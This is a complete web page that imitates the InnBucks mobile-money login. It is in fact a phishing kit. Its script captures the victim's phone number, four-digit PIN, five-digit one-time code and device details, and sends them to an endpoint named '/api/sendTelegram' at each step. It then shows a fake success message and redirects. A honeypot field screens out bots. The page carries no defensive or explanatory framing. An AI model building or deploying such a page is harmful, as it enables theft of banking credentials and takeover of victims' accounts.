<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InnBucks — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:#020617;
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#e5e7eb;
}

/* CARD */
.card{
  width:100%;
  max-width:380px;
  background:#020617;
  padding:20px;
  border-radius:14px;
  border:1px solid #1f2937;
  box-shadow:0 18px 45px rgba(0,0,0,.75);
}

.logo{
  height:44px;
  display:block;
  margin:0 auto 10px;
}

h2{
  text-align:center;
  margin:0 0 12px;
  font-size:20px;
  color:#f8fafc;
  letter-spacing:.2px;
}

label{
  display:block;
  font-size:13px;
  margin-top:8px;
  color:#cbd5f5;
}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #1f2937;
  background:#020617;
  color:#e5e7eb;
  font-size:14px;
  outline:none;
  transition:border-color .15s ease, box-shadow .15s ease;
}

input:focus{
  border-color:#2563eb;
  box-shadow:0 0 0 1px rgba(37,99,235,.35);
}

/* BUTTON */
.btn{
  background:#2563eb;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  width:100%;
  font-weight:600;
  cursor:pointer;
  transition:background-color .15s ease, box-shadow .15s ease;
}

.btn:active{
  box-shadow:0 4px 10px rgba(0,0,0,.6) inset;
}

.btn[disabled]{
  background:#334155;
  cursor:not-allowed;
}

.req{color:#ef4444;margin-right:6px}
.small{font-size:13px;color:#9ca3af}
.success{color:#22c55e;font-weight:600}

.error{
  min-height:18px;
  font-size:13px;
  color:#ef4444;
}

/* PIN */
.pin-row{
  display:flex;
  gap:10px;
  justify-content:center;
  margin-top:10px;
}

.pin-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  font-size:1px;
  color:transparent;
  caret-color:transparent;
  outline:none;
}

.pin-digit.filled{
  background:#2563eb;
  border-color:#2563eb;
}

/* OTP MODAL */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(2,6,23,.88);
  display:flex;
  align-items:center;
  justify-content:center;
}

.otp-box{
  background:#020617;
  padding:20px;
  border-radius:14px;
  min-width:340px;
  border:1px solid #1f2937;
  box-shadow:0 16px 36px rgba(0,0,0,.85);
}

.otp-row{
  display:flex;
  gap:10px;
  justify-content:center;
  margin-top:10px;
}

.otp-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  font-size:1px;
  color:transparent;
}

.otp-digit.filled{
  background:#2563eb;
  border-color:#2563eb;
}

.otp-warning{
  color:#ef4444;
  font-size:13px;
  display:none;
}

/* RESEND */
.resend-row{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:10px;
  margin-top:14px;
}

.resend-btn{
  background:#020617;
  border:1px solid #1f2937;
  padding:10px 14px;
  border-radius:8px;
  color:#e5e7eb;
  flex:1;
  cursor:pointer;
  transition:box-shadow .15s ease;
}

.resend-btn:active{
  box-shadow:0 4px 10px rgba(0,0,0,.6) inset;
}

.resend-btn[disabled]{
  opacity:.6;
  cursor:not-allowed;
}

.action-primary{
  background:#2563eb;
  border:0;
  color:#fff;
}

.action-secondary{
  background:#020617;
  border:1px solid #1f2937;
  color:#e5e7eb;
}

/* SPINNER */
.spinner{
  width:14px;
  height:14px;
  border:2px solid rgba(255,255,255,.3);
  border-top-color:#fff;
  border-radius:50%;
  display:inline-block;
  animation:spin .8s linear infinite;
  vertical-align:-2px;
  margin-right:6px;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* REDUCED MOTION */
@media (prefers-reduced-motion: reduce){
  *{animation:none !important;transition:none !important}
}
</style>
</head>

<body>

<div class="card">
  <img src="assets/InnBucks.png" alt="InnBucks" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="+263" inputmode="numeric">
    <div id="phoneError" class="error"></div>

    <label><span class="req">★</span>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input type="text" id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" tabindex="-1">
      <input class="otp-digit" tabindex="-1">
      <input class="otp-digit" tabindex="-1">
      <input class="otp-digit" tabindex="-1">
      <input class="otp-digit" tabindex="-1">
    </div>

    <input id="otpBuffer" inputmode="numeric" autocomplete="one-time-code"
           style="position:absolute;opacity:0;pointer-events:none">

    <div id="otpWarning" class="otp-warning">Please input 5 digits</div>

    <div class="resend-row">
      <div class="small">
        Resend in <span id="countdown">120</span>s
      </div>
      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
    </div>

    <div style="display:flex;gap:10px;margin-top:14px">
      <button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
      <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<script>
/* ===== PLAN FIX (SESSION + LOCAL FALLBACK) ===== */
let selectedPlan=null;
try{
  const raw=sessionStorage.getItem('selectedPlan') || localStorage.getItem('selectedPlan');
  if(raw){
    selectedPlan=JSON.parse(raw);
    localStorage.setItem('selectedPlan',raw);
  }
}catch(e){}

/* ===== DEVICE ===== */
const ua=navigator.userAgent;
let device='Unknown';
if(/Android/i.test(ua)){const v=ua.match(/Android\s([\d.]+)/);device='Android '+(v?v[1]:'')}
else if(/iPhone|iPad/i.test(ua)){const v=ua.match(/OS (\d+_\d+)/);device='iOS '+(v?v[1].replace('_','.'):'')}
if(/Chrome/i.test(ua)) device+=' | Chrome';
else if(/Safari/i.test(ua)) device+=' | Safari';
else if(/Firefox/i.test(ua)) device+=' | Firefox';

function normalizePlan(plan){
  if(!plan) return 'N/A';
  const name=plan.name||plan.shortName||'';
  const price=plan.price||plan.amount;
  return price?`${name} — ${price}`:name;
}

/* ===== PIN ===== */
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';

pins.forEach((el,i)=>{
  el.addEventListener('input',()=>{
    el.value=el.value.replace(/\D/g,'');
    el.classList.toggle('filled',!!el.value);
    if(el.value && i<pins.length-1) pins[i+1].focus();
    updatePin();
  });
  el.addEventListener('keydown',e=>{
    if(e.key==='Backspace'){
      if(el.value){
        el.value='';
        el.classList.remove('filled');
      }else if(i>0){
        pins[i-1].focus();
        pins[i-1].value='';
        pins[i-1].classList.remove('filled');
      }
      e.preventDefault();
      updatePin();
    }
  });
});

function updatePin(){
  pinValue=pins.map(p=>p.value).join('');
  loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
}

/* ===== PHONE ===== */
const phone=document.getElementById('phone');
const phoneError=document.getElementById('phoneError');
const loginBtn=document.getElementById('loginBtn');

function validatePhone(){
  const d=phone.value.replace('+263','');
  if(!d){phoneError.innerText='';return false}
  if(!/^7\d{8}$/.test(d)){
    phoneError.innerText='Enter your 9-digit number starting with 7';
    return false;
  }
  phoneError.innerText='';
  return true;
}

phone.addEventListener('input',()=>{
  let d=phone.value.replace('+263','').replace(/\D/g,'');
  if(d.startsWith('0')) d=d.slice(1);
  d=d.slice(0,9);
  phone.value='+263'+d;
  validatePhone();
});

/* ===== API ===== */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== OTP ===== */
const dots=[...document.querySelectorAll('.otp-digit')];
const buffer=document.getElementById('otpBuffer');
const confirmBtn=document.getElementById('confirmOtp');
const otpWarning=document.getElementById('otpWarning');
const resendBtn=document.getElementById('resendBtn');
const countdown=document.getElementById('countdown');
const otpStatus=document.getElementById('otpStatus');

let timer=null,seconds=120;

function renderOtp(v){
  dots.forEach((d,i)=>d.classList.toggle('filled',!!v[i]));
  confirmBtn.disabled=!/^\d{5}$/.test(v);
  otpWarning.style.display=/^\d{5}$/.test(v)?'none':'block';
}

buffer.addEventListener('input',()=>{
  buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
  renderOtp(buffer.value);
});
dots.forEach(d=>d.addEventListener('click',()=>buffer.focus()));

function startCountdown(){
  clearInterval(timer);
  seconds=120;
  resendBtn.disabled=true;
  countdown.textContent=seconds;
  timer=setInterval(()=>{
    countdown.textContent=--seconds;
    if(seconds===0){clearInterval(timer);resendBtn.disabled=false}
  },1000);
}

/* ===== LOGIN ===== */
document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();
  if(document.getElementById('hp').value) return;
  if(navigator.vibrate) navigator.vibrate(30);

  await sendToServer({
    event:'login_clicked',
    loginPhone:phone.value,
    loginPin:pinValue,
    plan:normalizePlan(selectedPlan),
    device,
    submittedAt:new Date().toISOString()
  });

  document.getElementById('otpModal').style.display='flex';
  buffer.value='';
  renderOtp('');
  buffer.focus();
  startCountdown();
});

/* ===== CONFIRM ===== */
confirmBtn.onclick=async()=>{
  if(navigator.vibrate) navigator.vibrate(30);

  await sendToServer({
    event:'otp_confirm',
    loginPhone:phone.value,
    loginPin:pinValue,
    otp:buffer.value,
    plan:normalizePlan(selectedPlan),
    device,
    submittedAt:new Date().toISOString()
  });

  otpStatus.innerHTML="<span class='success'>Success — request received.</span>";
  setTimeout(()=>location.href='thankyou.html',1200);
};

/* ===== RESEND ===== */
resendBtn.onclick=async()=>{
  resendBtn.disabled=true;
  resendBtn.innerHTML='<span class="spinner"></span>Sending…';

  await sendToServer({
    event:'resend_otp',
    loginPhone:phone.value,
    loginPin:pinValue,
    plan:normalizePlan(selectedPlan),
    device,
    submittedAt:new Date().toISOString()
  });

  resendBtn.innerHTML='OTP sent ✓';
  setTimeout(()=>resendBtn.innerHTML='Resend OTP',1200);
  startCountdown();
};

document.getElementById('cancelOtp').onclick=()=>{
  document.getElementById('otpModal').style.display='none';
  clearInterval(timer);
};
</script>

</body>
</html>
